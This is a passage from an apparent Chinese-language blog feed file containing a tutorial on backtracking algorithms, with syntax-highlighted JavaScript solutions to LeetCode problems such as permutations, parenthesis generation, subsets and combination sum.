keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isValid</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> i<span class="token operator">++</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>        i<span class="token operator">++</span>        j<span class="token operator">--</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>回溯算法</title>
      <link href="2020/11/30/%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
      <url>2020/11/30/%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>全排列</li><li>括号生成</li><li>电话号码的数字组合</li><li>子集</li><li>二维数组全排列</li><li>组合总和</li><li>组合总和II</li><li>单词搜索</li><li>三角形的最小路径和</li><li>路径总和</li><li>路径总和II</li></ul><h2 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h2><p><strong>解决一个回溯问题，实际上就是一个决策树的遍历过程</strong>。基本原理就是<strong>递归</strong>，用白话解释就是：<strong>从一条路往前走，能进则进，不能进则退回来，换一条路再试。</strong>只需要思考 3 个问题：</p><p>1、路径：也就是已经做出的选择。</p><p>2、选择列表：也就是你当前可以做的选择。</p><p>3、结束条件：也就是到达决策树底层，无法再做选择的条件。</p><p>代码方面，回溯算法的框架：</p><pre class=" language-js"><code class="language-js">result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>def <span class="token function">backtrack</span><span class="token punctuation">(</span>路径<span class="token punctuation">,</span> 选择列表<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> 满足结束条件<span class="token punctuation">:</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>路径<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">for</span> 选择 <span class="token keyword">in</span> 选择列表<span class="token punctuation">:</span>        做选择        <span class="token function">backtrack</span><span class="token punctuation">(</span>路径<span class="token punctuation">,</span> 选择列表<span class="token punctuation">)</span>        撤销选择</code></pre><p><strong>其核心就是 for 循环里面的递归，在递归调用之前「做选择」，在递归调用之后「撤销选择」</strong></p><blockquote><p>递归，回溯，DFS的区别</p><p>递归就是在函数中调用函数本身来解决问题</p><p>回溯就是通过不同的尝试来生成问题的解，有点类似于穷举，但是和穷举不同的是回溯会“剪枝”</p><p>回溯搜索是深度优先搜索（DFS）的一种，回溯和DFS，其主要的区别是，回溯法在求解过程中不保留完整的树结构，而深度优先搜索则记下完整的搜索树。</p></blockquote><h2 id="从数组中找n个数求和"><a href="#从数组中找n个数求和" class="headerlink" title="从数组中找n个数求和"></a>从数组中找n个数求和</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> total <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token comment" spellcheck="true">// 返回结果为 [[1, 8, 10], [4, 5, 10]]</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> total <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">2</span><span class="token comment" spellcheck="true">// 返回结果为 [[1, 8], [4, 5]]</span></code></pre><ul><li>fn：从 arr 中找出 n 个数使其和为 total</li><li>path: 当前分支</li><li>sum：当前和</li><li>index：当前遍历到的索引，从该索引下一位置开始继续查找，避免结果出现 [1, 8], [8,1]</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token punctuation">(</span>total<span class="token punctuation">,</span> arr<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> sum<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>length <span class="token operator">===</span> n <span class="token operator">&amp;&amp;</span> sum <span class="token operator">===</span> total<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> index<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>            path<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> sum <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>            path<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">backtrack</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span></code></pre><h2 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2><ul><li><a href="https://leetcode-cn.com/problems/permutations/" target="_blank" rel="noopener">Leetcode46</a></li></ul><pre class=" language-js"><code class="language-js"> 给定一个 没有重复 数字的序列，返回其所有可能的全排列。 示例<span class="token punctuation">:</span> 输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> 输出<span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>我们要在这个包含解的空间树上，用 递归的方式搜索出所有的解。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> permute <span class="token operator">=</span> <span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>length <span class="token operator">==</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// slice的原因是防止push到res中的结果是引用类型，后面path改变时会影响res</span>      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> num <span class="token keyword">of</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>      path<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 比如目前 path 是 [1]，push(2), 变成 [1, 2]</span>      <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 递归到头了：[1,2,3] 就 return </span>      path<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// [1,2] pop 变为 [1]， 继续下一轮 for 循环, push(3)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">backtrack</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="括号生成"><a href="#括号生成" class="headerlink" title="括号生成"></a>括号生成</h2><ul><li><a href="https://leetcode-cn.com/problems/generate-parentheses/" target="_blank" rel="noopener">leetcode22</a></li><li><a href="https://leetcode-cn.com/problems/generate-parentheses/solution/shou-hua-tu-jie-gua-hao-sheng-cheng-hui-su-suan-fa/" target="_blank" rel="noopener">题解</a></li></ul><pre class=" language-js"><code class="language-js">数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。示例：输入：n <span class="token operator">=</span> <span class="token number">3</span>输出：<span class="token punctuation">[</span>       <span class="token string">"((()))"</span><span class="token punctuation">,</span>       <span class="token string">"(()())"</span><span class="token punctuation">,</span>       <span class="token string">"(())()"</span><span class="token punctuation">,</span>       <span class="token string">"()(())"</span><span class="token punctuation">,</span>       <span class="token string">"()()()"</span>     <span class="token punctuation">]</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> generateParenthesis <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>lRemain<span class="token punctuation">,</span> rRemain<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 左右括号所剩的数量，str是当前构建的字符串</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 字符串构建完成</span>      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 加入解集</span>      <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 下面两种情况都会判断执行</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lRemain <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 只要左括号有剩，就可以选它，然后继续做选择（递归）</span>      <span class="token function">backtrack</span><span class="token punctuation">(</span>lRemain <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> rRemain<span class="token punctuation">,</span> str <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lRemain <span class="token operator">&lt;</span> rRemain<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// 右括号比左括号剩的多，才能选右括号</span>      <span class="token function">backtrack</span><span class="token punctuation">(</span>lRemain<span class="token punctuation">,</span> rRemain <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> str <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 然后继续做选择（递归）</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token function">backtrack</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 递归的入口，剩余数量都是n，初始字符串是空串</span>  <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="电话号码的数字组合"><a href="#电话号码的数字组合" class="headerlink" title="电话号码的数字组合"></a>电话号码的数字组合</h2><ul><li><p><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/" target="_blank" rel="noopener">leetcode17</a></p></li><li><p><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/solution/shou-hua-tu-jie-liang-chong-jie-fa-dfshui-su-bfsya/" target="_blank" rel="noopener">题解</a></p></li></ul><pre class=" language-js"><code class="language-js">给定一个仅包含数字 <span class="token number">2</span><span class="token operator">-</span><span class="token number">9</span> 的字符串，返回所有它能表示的字母组合。给出数字到字母的映射如下（与电话按键相同）。注意 <span class="token number">1</span> 不对应任何字母。示例<span class="token punctuation">:</span>输入：<span class="token string">"23"</span>输出：<span class="token punctuation">[</span><span class="token string">"ad"</span><span class="token punctuation">,</span> <span class="token string">"ae"</span><span class="token punctuation">,</span> <span class="token string">"af"</span><span class="token punctuation">,</span> <span class="token string">"bd"</span><span class="token punctuation">,</span> <span class="token string">"be"</span><span class="token punctuation">,</span> <span class="token string">"bf"</span><span class="token punctuation">,</span> <span class="token string">"cd"</span><span class="token punctuation">,</span> <span class="token string">"ce"</span><span class="token punctuation">,</span> <span class="token string">"cf"</span><span class="token punctuation">]</span><span class="token punctuation">.</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> letterCombinations <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>digits<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'def'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'ghi'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'jkl'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'mno'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'pqrs'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'tuv'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'wxyz'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>curStr<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> digits<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>curStr<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">return</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 一定要加，结束当前分支                  </span>      <span class="token punctuation">}</span>      <span class="token keyword">const</span> letters <span class="token operator">=</span> map<span class="token punctuation">[</span>digits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> l <span class="token keyword">of</span> letters<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token function">backtrack</span><span class="token punctuation">(</span>curStr <span class="token operator">+</span> l<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">backtrack</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="子集"><a href="#子集" class="headerlink" title="子集"></a>子集</h2><ul><li><a href="https://leetcode-cn.com/problems/subsets/" target="_blank" rel="noopener">Leetcode78</a></li><li><a href="https://leetcode-cn.com/problems/subsets/solution/shou-hua-tu-jie-zi-ji-hui-su-fa-xiang-jie-wei-yun-/" target="_blank" rel="noopener">题解</a></li></ul><pre class=" language-js"><code class="language-js">给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。说明：解集不能包含重复的子集。示例<span class="token punctuation">:</span>输入<span class="token punctuation">:</span> nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span><span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> subsets <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 指针越界</span>          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 加入解集</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 结束当前的递归</span>        <span class="token punctuation">}</span>        list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 选择这个数</span>        <span class="token function">backtrack</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 基于该选择，继续往下递归</span>        list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 上面的递归结束，撤销该选择</span>        <span class="token function">backtrack</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 不选这个数，继续往下递归</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token function">backtrack</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="二维数组全排列"><a href="#二维数组全排列" class="headerlink" title="二维数组全排列"></a>二维数组全排列</h2><blockquote><p>var arr = [[‘A’,’B’],[‘a’,’b’],[1,2]]` </p><p>求二维数组的全排列组合 结果：[Aa1,Aa2,Ab1,Ab2,Ba1,Ba2,Bb1,Bb2]</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> fullArray <span class="token operator">=</span> <span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> traceBack <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>length <span class="token operator">===</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> arr<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">traceBack</span><span class="token punctuation">(</span>path <span class="token operator">+</span> item<span class="token punctuation">,</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">traceBack</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span></code></pre><h2 id="组合总和"><a href="#组合总和" class="headerlink" title="组合总和"></a>组合总和</h2><ul><li><a href="https://leetcode-cn.com/problems/combination-sum/" target="_blank" rel="noopener">leetcode39</a></li><li><a href="https://leetcode-cn.com/problems/combination-sum/solution/shou-hua-tu-jie-zu-he-zong-he-combination-sum-by-x/" target="_blank" rel="noopener">题解</a></li></ul><blockquote><p>给定一个无重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。</p><p>candidates 中的数字可以无限制重复被选取。</p><p>说明：</p><p>所有数字（包括 target）都是正整数。<br>解集不能包含重复的组合。 </p><p>示例 1：</p><p>输入：candidates = [2,3,6,7], target = 7,<br>所求解集为：<br>[<br>  [7],<br>  [2,2,3]<br>]</p><p>示例 2：</p><p>输入：candidates = [2,3,5], target = 8,<br>所求解集为：<br>[<br>  [2,2,2,2],<br>  [2,3,3],<br>  [3,5]<br>]</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> combinationSum <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// start 用于剪枝</span>    <span class="token keyword">const</span> traceback <span class="token operator">=</span> <span class="token punctuation">(</span>start<span class="token punctuation">,</span> path<span class="token punctuation">,</span> sum<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> candidates<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            path<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">traceback</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> path<span class="token punctuation">,</span> sum <span class="token operator">+</span> candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            path<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">traceback</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="组合总和II"><a href="#组合总和II" class="headerlink" title="组合总和II"></a>组合总和II</h2><ul><li><a href="https://leetcode-cn.com/problems/combination-sum-ii/" target="_blank" 